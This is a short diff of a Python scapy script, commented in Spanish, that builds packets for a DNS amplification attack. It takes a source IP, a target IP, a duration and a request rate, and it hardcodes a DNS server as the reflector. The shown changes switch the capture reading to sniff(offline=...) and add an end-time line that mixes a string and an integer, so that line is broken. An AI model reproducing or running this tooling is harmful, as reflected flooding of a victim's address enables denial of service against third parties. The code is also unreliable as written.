@@ -2,6 +2,7 @@ from scapy.all import *
 import sys
 from os import urandom
 from random import randint
+from randFloats import *
 
 def amplificationBuilder(ip_src,ip_dest, src_port, q_name):
     #Constructor de paquetes con las características necesarias para ser una request para el ataque de amplificación
@@ -47,16 +48,18 @@ def main():
     #sys.argv[2]: ip target
     #sys.argv[3]: Cantidad de tiempo (segundos)
     #sys.argv[4]: Cantidad de requests por segundo
-    #sys.argv[5]: Inicio del ataque (ver en que se medirá)
+    #sys.argv[5]: Fecha de inicio del ataque TODO: ver en que se medirá
     #sys.argv[6]: Tiempo de demora de la respuesta para cada request
 
-    paquetes = rdpcap(str(sys.argv[1]))
+
     ip = str(sys.argv[2])
     duracion = int(sys.argv[3])
     c = int(sys.argv[4])
     inicio = sys.argv[5]
-    t = sys.argv[6]
+    dt = sys.argv[6]
 
-    t0 = paquetes[0].time
+    p0 = sniff(offline = str(sys.argv[1]), count = 1)
+    t0 = p0[0].time
+    tf = inicio + duracion
     serv = '200.7.4.7'
     srcport = 33865 #Cualquier puerto grande
